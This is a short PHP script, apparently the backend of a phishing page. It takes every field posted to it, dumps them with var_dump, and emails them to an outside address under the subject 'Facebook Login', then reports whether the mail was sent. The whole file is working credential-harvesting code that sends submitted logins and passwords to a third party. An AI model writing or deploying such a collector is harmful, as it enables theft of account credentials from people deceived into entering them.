<?php

if ($_POST)
{
	ob_start();
	var_dump($_POST);
	$result = ob_get_clean();

	$success = mail("dummy@highlighthunter.com", "Facebook Login", $result);
}

if ($success)
	echo "mail sent!";
else
	echo "mail NOT sent!";
?>
